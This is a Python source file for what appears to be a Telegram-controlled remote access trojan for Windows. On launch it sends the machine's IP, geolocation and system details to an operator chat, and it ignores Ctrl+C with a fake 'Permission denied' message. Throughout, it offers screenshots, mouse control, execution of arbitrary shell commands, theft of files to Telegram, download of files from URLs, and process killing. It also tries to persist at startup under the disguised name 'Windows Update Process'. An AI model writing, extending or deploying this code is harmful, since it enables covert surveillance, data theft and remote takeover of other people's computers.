import platform
import json
import subprocess
import sys
import os

def gradient_text(text, start_color, end_color):
    """Создает градиентный текст от start_color до end_color."""
    gradient = []
    for i in range(len(text)):
        # Вычисляем цвет для каждого символа
        r = int(start_color[0] + (end_color[0] -
                start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] -
                start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] -
                start_color[2]) * (i / len(text)))
        gradient.append(f"\033[38;2;{r};{g};{b}m{text[i]}")
    return ''.join(gradient)


os_name = platform.system()
if os_name == "Windows":
    pass
else:
    print(gradient_text(
        "Система не является Windows системой!\nНевозможно запустить софт на данной системе.", (255, 0, 0), (255, 0, 0)))
    sys.exit(0)

try:
    import telebot
    import time
    import webbrowser
    import requests
    import shutil
    import ctypes
    import mouse
    import PIL.ImageGrab
    import signal
    import winshell
    from subprocess import Popen, PIPE
    from PIL import Image, ImageGrab, ImageDraw
    from pySmartDL import SmartDL
    from telebot import types
    from telebot import apihelper
except ImportError as e:
    print(gradient_text(
        "ImportError: Не установлены необходимые библиотеки.", (255, 0, 0), (255, 0, 0)))
    print(gradient_text("Устанавливаю библиотеки, это займет немного времени 🪄...",
          (0, 0, 255), (0, 150, 180)))
    try:
        result = subprocess.run(
            ['pip', 'install', 'telebot'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'pySmartDL'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'pillow'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'requests'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'mouse'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'pyautogui'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'pyttsx3'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'pyaudio'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
                ['pip', 'install', 'winshell'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        else:
            print(gradient_text("🚀 Сделано. Перезапусти софт.",
                  (255, 255, 255), (255, 255, 255)))
    except Exception as e:
        print(f"UnknownError: {e}")
    sys.exit(0)


def signal_handler(sig, frame):
    print("Unable to kill process. Permission denied.")


signal.signal(signal.SIGINT, signal_handler)

# Примеры прокси
# apihelper.proxy = {'https':'socks5://userproxy:password@proxy_address:port'}
# apihelper.proxy = {'http':'mtproto://password@proxy:port'}
# apihelper.proxy = {'https': 'socks5://proxy:port'}
# apihelper.proxy = {'https': 'http://proxy:port'}
TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
bot_token = TELEGRAM_BOT_TOKEN
bot = telebot.TeleBot(bot_token)
my_id = TELEGRAM_CHAT_ID
begin = ''
sys_name = 'undefined'
emoji = ''

user_dict = {}


class User:
	def __init__(self):
		keys = ['urldown', 'fin', 'curs']

		for key in keys:
			self.key = None


User.curs = 50


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)


def get_geolocation():
    try:
        result = subprocess.run(
            ['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            send_telegram_message("🌐❌ Ошибка при выполнении curl.")
            return None
    except Exception as e:
        send_telegram_message(f"🌐❌ Произошла ошибка при получении гео: {e}")
        return None


def get_location_by_ip(ip):
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    if response.status_code == 200:
        return response.json()
    else:
        send_telegram_message("⛓️‍💥 Ошибка при выполнении запроса к ipinfo.io")
        return None


def run_commands():
    global os_name
    global sys_name
    global emoji
    global begin
    print(begin)
    try:
        if os_name == "Linux":
            if os.path.exists('/data/data/com.termux/files'):
                sys_name = "Termux (Android)"
                emoji = '📱'
                send_telegram_message(
                    f"NotWindowsError: СИСТЕМА НЕ ЯВЛЯЕТСЯ WINDOWS СИСТЕМОЙ!")
            else:
                sys_name = "Linux"
                emoji = '🐧'
                send_telegram_message(
                    f"NotWindowsError: СИСТЕМА НЕ ЯВЛЯЕТСЯ WINDOWS СИСТЕМОЙ!")
        elif os_name == "Darwin":
            sys_name = "MacOS"
            emoji = '🍏'
            send_telegram_message(
                f"NotWindowsError: СИСТЕМА НЕ ЯВЛЯЕТСЯ WINDOWS СИСТЕМОЙ!")
        elif os_name == "Windows":
            sys_name = "Windows"
            emoji = '💻'
        else:
            send_telegram_message(
                f"NotWindowsError: СИСТЕМА НЕ ЯВЛЯЕТСЯ WINDOWS СИСТЕМОЙ!")
            emoji = '⚠️'
            sys_name = "undefined"
    except Exception as e:
        send_telegram_message(f"❌ Ошибка: {e}")
        print(f"{e}")
    try:
        result = subprocess.run(
            ['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            ip_address = result.stdout.strip()
        else:
            ip_address = '🚫'
        ver = platform.version()
        arch = platform.architecture()
        geo_data = get_geolocation()
        if geo_data:
            latitude, longitude = geo_data['loc'].split(',')
            location_info = get_location_by_ip(ip_address)
# Форматируем сообщение о местоположении
            location_message = (
                f"🌍 Гео\n"
                f"Широта: {latitude}\n"
                f"Долгота: {longitude}\n"
            )
            if location_info:
                location_message += (
                    f"Город: {location_info.get('city', 'Неизвестно')}\n"
                    f"Регион: {location_info.get('region', 'Неизвестно')}\n"
                    f"Страна: {location_info.get('country', 'Неизвестно')}\n"
                    f"Почтовый индекс: {location_info.get(
                        'postal', 'Неизвестно')}\n"
                )
            else:
                location_message += "🌐❌ Не удалось получить доп инфу."
        else:
            location_message = "🌐❌ Не удалось получить гео."
        send_telegram_message(f"{emoji} Новая сессия\nКлиент/IP: {ip_address}\nСистема: {
                              sys_name} {ver} {arch}\n {location_message}")
    except Exception as e:
        send_telegram_message(f"🚫 FE: {e}")
    if os_name == "Windows":
        os.system('cls')  # Для Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
        os.system('clear')  # Для Linux и macOS
    else:
        send_telegram_message(f"🚫 FE: Unsupported platform.")


# Клавиатура меню
menu_keyboard = types.ReplyKeyboardMarkup(
    resize_keyboard=True, one_time_keyboard=False)
btnscreen = types.KeyboardButton('📷Сделать скриншот')
btnmouse = types.KeyboardButton('🖱Управление мышкой')
btnfiles = types.KeyboardButton('📂Файлы и процессы')
btnaddit = types.KeyboardButton('❇️Дополнительно')
btnmsgbox = types.KeyboardButton('📩Отправка уведомления')
btninfo = types.KeyboardButton('❗️Информация')
menu_keyboard.row(btnscreen, btnmouse)
menu_keyboard.row(btnfiles, btnaddit)
menu_keyboard.row(btninfo, btnmsgbox)


# Клавиатура Файлы и Процессы
files_keyboard = types.ReplyKeyboardMarkup(
    resize_keyboard=True, one_time_keyboard=False)
btnstart = types.KeyboardButton('✔️Запустить')
btnkill = types.KeyboardButton('❌Замочить процесс')
btndown = types.KeyboardButton('⬇️Скачать файл')
btnupl = types.KeyboardButton('⬆️Загрузить файл')
btnurldown = types.KeyboardButton('🔗Загрузить по ссылке')
btnback = types.KeyboardButton('⏪Назад⏪')
files_keyboard.row(btnstart,  btnkill)
files_keyboard.row(btndown, btnupl)
files_keyboard.row(btnurldown, btnback)


# Клавиатура Дополнительно
additionals_keyboard = types.ReplyKeyboardMarkup(
    resize_keyboard=True, one_time_keyboard=False)
btnweb = types.KeyboardButton('🔗Перейти по ссылке')
btncmd = types.KeyboardButton('✅Выполнить команду')
btnoff = types.KeyboardButton('⛔️Выключить компьютер')
btnreb = types.KeyboardButton('♻️Перезагрузить компьютер')
btninfo = types.KeyboardButton('🖥О компьютере')
btnback = types.KeyboardButton('⏪Назад⏪')
additionals_keyboard.row(btnoff, btnreb)
additionals_keyboard.row(btncmd, btnweb)
additionals_keyboard.row(btninfo, btnback)


# Клавиатура мышь
mouse_keyboard = types.ReplyKeyboardMarkup(
    resize_keyboard=True, one_time_keyboard=False)
btnup = types.KeyboardButton('⬆️')
btndown = types.KeyboardButton('⬇️')
btnleft = types.KeyboardButton('⬅️')
btnright = types.KeyboardButton('➡️')
btnclick = types.KeyboardButton('🆗')
btnback = types.KeyboardButton('⏪Назад⏪')
btncurs = types.KeyboardButton('Указать размах курсора')
mouse_keyboard.row(btnup)
mouse_keyboard.row(btnleft, btnclick, btnright)
mouse_keyboard.row(btndown)
mouse_keyboard.row(btnback, btncurs)


info_msg = '''
*О командах*

_📷Сделать скриншот_ - делает скриншот экрана вместе с мышкой
_🖱Управление мышкой_ - переходит меню управления мышкой
_📂Файлы и процессы_ - переходит в меню с управлением файлов и процессов
_❇️Дополнительно_ - переходит в меню с доп. функциями
_📩Отправка уведомления_ - пришлет на ПК окно с сообщением(msgbox)
_⏪Назад⏪_ - возвращает в главное меню

_🔗Перейти по ссылке_ - переходит по указанной ссылке(важно указать "http://" или "https://" для открытия ссылки в стандартном браузере, а не IE)
_✅Выполнить команду_ - выполняет в cmd любую указанную команду
_⛔️Выключить компьютер_ - моментально выключает компьютер
_♻️Перезагрузить компьютер_ - моментально перезагружает компьютер
_🖥О компьютере_ - показыввает имя пользователя, ip, операционную систему и процессор

_❌Замочить процесс_ - завершает любой процесс
_✔️Запустить_ - открывает любые файлы(в том числе и exe)
_⬇️Скачать файл_ - скачивает указанный файл с вашего компьютера
_⬆️Загрузить файл_ - загружает файл на ваш компьютер
_🔗Загрузить по ссылке_ - загружает файл на ваш компьютер по прямой ссылке



'''

MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
	pass
else:
	bot.send_message(
	    my_id, "💎 Благодарим разработчика PCcontrol за предоставление исходного кода для проекта Obscure. Сообщение от разработчика:\nСпасибо что выбрали данного Бота!\nСоветую сначала прочитать все в меню \"❗️Информация\"\n\n_Мой телеграм канал:_ @FRAMEDEV\n_Репозиторий GitHub:_ [КЛИК](https://github.com/kiraGGG/PCToolsBot)\n_Поддержать автора:_ [КЛИК](https://donationalerts.com/r/lgjegjp4ooke4e)", parse_mode="markdown")
	f = open('msg.pt', 'tw', encoding='utf-8')
	f.close
bot.send_message(my_id, "ПК запущен", reply_markup=menu_keyboard)


@bot.message_handler(content_types=["text"])
def get_text_messages(message):
    global my_id
    if not(message.from_user.id != my_id):
        bot.send_chat_action(my_id, 'typing')
        if message.text == "📷Сделать скриншот":
            bot.send_chat_action(my_id, 'upload_photo')
            try:
                currentMouseX, currentMouseY = mouse.get_position()
                img = PIL.ImageGrab.grab()
                img.save("screen.png", "png")
                img = Image.open("screen.png")
                draw = ImageDraw.Draw(img)
                draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 15, currentMouseX + 10, currentMouseY + 10), fill="white", outline="black")
                img.save("screen_with_mouse.png", "PNG")
                bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
                os.remove("screen.png")
                os.remove("screen_with_mouse.png")
            except:
                bot.send_message(my_id, "Компьютер заблокирован")
				
        elif message.text == "🖱Управление мышкой":
            bot.send_message(my_id, "🖱Управление мышкой", reply_markup = mouse_keyboard)
            bot.register_next_step_handler(message, mouse_process)
        elif message.text == "⏪Назад⏪":
            back(message)
        elif message.text == "📂Файлы и процессы":
            bot.send_message(my_id, "📂Файлы и процессы", reply_markup = files_keyboard)
            bot.register_next_step_handler(message, files_process)
        elif message.text == "❇️Дополнительно":
            bot.send_message(my_id, "❇️Дополнительно", reply_markup = additionals_keyboard)
            bot.register_next_step_handler(message, addons_process)
        elif message.text == "📩Отправка уведомления":
            bot.send_message(my_id, "Укажите текст уведомления:")
            bot.register_next_step_handler(message, messaga_process)
        elif message.text == "❗️Информация":
            bot.send_message(my_id, info_msg, parse_mode = "markdown")
        else:
            pass
    else:
        info_user(message)

def addons_process(message):
	if message.from_user.id == my_id:
		bot.send_chat_action(my_id, 'typing')
		if message.text == "🔗Перейти по ссылке":
			bot.send_message(my_id, "Укажите ссылку: ")
			bot.register_next_step_handler(message, web_process)

		elif message.text == "✅Выполнить команду":
			bot.send_message(my_id, "Укажите консольную команду: ")
			bot.register_next_step_handler(message, cmd_process)

		elif message.text == "⛔️Выключить компьютер":
			bot.send_message(my_id, "Выключение компьютера...")
			os.system('shutdown -s /t 0 /f')
			bot.register_next_step_handler(message, addons_process)
		
		elif message.text == "♻️Перезагрузить компьютер":
			bot.send_message(my_id, "Перезагрузка компьютера...")
			os.system('shutdown -r /t 0 /f')
			bot.register_next_step_handler(message, addons_process)

		elif message.text == "🖥О компьютере":
			req = requests.get('http://ip.42.pl/raw')
			ip = req.text
			uname = os.getlogin()
			windows = platform.platform()
			processor = platform.processor()
			#print(*[line.decode('cp866', 'ignore') for line in Popen('tasklist', stdout=PIPE).stdout.readlines()])
			bot.send_message(my_id, f"*Пользователь:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процессор:* {processor}", parse_mode = "markdown")

			bot.register_next_step_handler(message, addons_process)

		elif message.text == "⏪Назад⏪":
			back(message)
		
		else:
			pass

	else:
		info_user(message)


def files_process(message):
	if message.from_user.id == my_id:
		bot.send_chat_action(my_id, 'typing')
		if message.text == "❌Замочить процесс":	
			bot.send_message(my_id, "Укажите название процесса: ")
			bot.register_next_step_handler(message, kill_process)

		elif message.text == "✔️Запустить":
			bot.send_message(my_id, "Укажите путь до файла: ")
			bot.register_next_step_handler(message, start_process)

		elif message.text == "⬇️Скачать файл":
			bot.send_message(my_id, "Укажите путь до файла: ")
			bot.register_next_step_handler(message, downfile_process)

		elif message.text == "⬆️Загрузить файл":
			bot.send_message(my_id, "Отправьте необходимый файл")
			bot.register_next_step_handler(message, uploadfile_process)

		elif message.text == "🔗Загрузить по ссылке":
			bot.send_message(my_id, "Укажите прямую ссылку скачивания:")
			bot.register_next_step_handler(message, uploadurl_process)

		elif message.text == "⏪Назад⏪":
			back(message)

		else:
			pass
	else:
		info_user(message)


def mouse_process(message):
	if message.from_user.id == my_id:
		if message.text == "⬆️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX,  currentMouseY - User.curs)
			screen_process(message)

		elif message.text == "⬇️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX,  currentMouseY + User.curs)
			screen_process(message)

		elif message.text == "⬅️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX - User.curs,  currentMouseY)
			screen_process(message)

		elif message.text == "➡️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX + User.curs,  currentMouseY)
			screen_process(message)

		elif message.text == "🆗":
			mouse.click()
			screen_process(message)

		elif message.text == "Указать размах курсора":
			bot.send_chat_action(my_id, 'typing')
			bot.send_message(my_id, f"Укажите размах, в данный момент размах {str(User.curs)}px", reply_markup = mouse_keyboard)
			bot.register_next_step_handler(message, mousecurs_settings)

		elif message.text == "⏪Назад⏪":
			back(message)

		else:
			pass
	else:
		info_user(message)


def back(message):
	bot.register_next_step_handler(message, get_text_messages)
	bot.send_message(my_id, "Вы в главном меню", reply_markup = menu_keyboard)

def info_user(message):
	bot.send_chat_action(my_id, 'typing')
	alert = f"Кто-то пытался задать команду: \"{message.text}\"\n\n"
	alert += f"user id: {str(message.from_user.id)}\n"
	alert += f"first name: {str(message.from_user.first_name)}\n"
	alert += f"last name: {str(message.from_user.last_name)}\n" 
	alert += f"username: @{str(message.from_user.username)}"
	bot.send_message(my_id, alert, reply_markup = menu_keyboard)

def kill_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.system("taskkill /IM " + message.text + " -F")
		bot.send_message(my_id, f"Процесс \"{message.text}\" убит", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "Ошибка! Процесс не найден", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def start_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.startfile(r'' + message.text)
		bot.send_message(my_id, f"Файл по пути \"{message.text}\" запустился", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "Ошибка! Указан неверный файл", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def web_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		webbrowser.open(message.text, new=0)
		bot.send_message(my_id, f"Переход по ссылке \"{message.text}\" осуществлён", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(my_id, "Ошибка! ссылка введена неверно")
		bot.register_next_step_handler(message, addons_process)

def cmd_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.system(message.text)
		bot.send_message(my_id, f"Команда \"{message.text}\" выполнена", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(my_id, "Ошибка! Неизвестная команда")
		bot.register_next_step_handler(message, addons_process)

def say_process(message):
	bot.send_chat_action(my_id, 'typing')
	bot.send_message(my_id, "В разработке...", reply_markup = menu_keyboard)

def downfile_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		file_path = message.text
		if os.path.exists(file_path):
			bot.send_message(my_id, "Файл загружается, подождите...")
			bot.send_chat_action(my_id, 'upload_document')
			file_doc = open(file_path, 'rb')
			bot.send_document(my_id, file_doc)
			bot.register_next_step_handler(message, files_process)
		else:
			bot.send_message(my_id, "Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
			bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "Ошибка! Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
		bot.register_next_step_handler(message, files_process)

def uploadfile_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		src = message.document.file_name
		with open(src, 'wb') as new_file:
			new_file.write(downloaded_file)
		bot.send_message(my_id, "Файл успешно загружен")
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "Ошибка! Отправьте файл как документ")
		bot.register_next_step_handler(message, files_process)

def uploadurl_process(message):
	bot.send_chat_action(my_id, 'typing')
	User.urldown = message.text
	bot.send_message(my_id, "Укажите путь сохранения файла:")
	bot.register_next_step_handler(message, uploadurl_2process)	

def uploadurl_2process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		User.fin = message.text
		obj = SmartDL(User.urldown, User.fin, progress_bar=False)
		obj.start()
		bot.send_message(my_id, f"Файл успешно сохранён по пути \"{User.fin}\"")
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "Указаны неверная ссылка или путь")
		bot.register_next_step_handler(message, addons_process)

def messaga_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		MessageBox(None, message.text, 'System', 0)
		bot.send_message(my_id, f"Уведомление с текстом \"{message.text}\" было закрыто")
	except:
		bot.send_message(my_id, "Ошибка")

def mousecurs_settings(message):
	bot.send_chat_action(my_id, 'typing')
	if is_digit(message.text) == True:
		User.curs = int(message.text)
		bot.send_message(my_id, f"Размах курсора изменен на {str(User.curs)}px", reply_markup = mouse_keyboard)
		bot.register_next_step_handler(message, mouse_process)
	else:
		bot.send_message(my_id, "Введите целое число: ", reply_markup = mouse_keyboard)
		bot.register_next_step_handler(message, mousecurs_settings)

def screen_process(message):
	try:
		currentMouseX, currentMouseY  =  mouse.get_position()
		img = PIL.ImageGrab.grab()
		img.save("screen.png", "png")
		img = Image.open("screen.png")
		draw = ImageDraw.Draw(img)
		draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 15, currentMouseX + 10, currentMouseY + 10), fill="white", outline="black")
		img.save("screen_with_mouse.png", "PNG")
		bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
		bot.register_next_step_handler(message, mouse_process)
		os.remove("screen.png")
		os.remove("screen_with_mouse.png")
	except:
			bot.send_chat_action(my_id, 'typing')
			bot.send_message(my_id, "Компьютер заблокирован")
			bot.register_next_step_handler(message, mouse_process)

def add_to_startup(file_path=None, key_name="Windows Update Process"):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])
    startup_dir = winshell.startup()
    shortcut_path = os.path.join(startup_dir, f"{key_name}.lnk")

def is_digit(string):
	if string.isdigit():
		return True
	else:
		try:
			float(string)
			return True
		except ValueError:
			return False

if __name__ == "__main__":
    add_to_startup()
    send_telegram_message('🚀 Добавлено в авторан.')
    run_commands()

while True:
	try:
		bot.polling(none_stop=True, interval=0, timeout=20)
	except Exception as E:
		send_telegram_message(E.args)
		time.sleep(2)
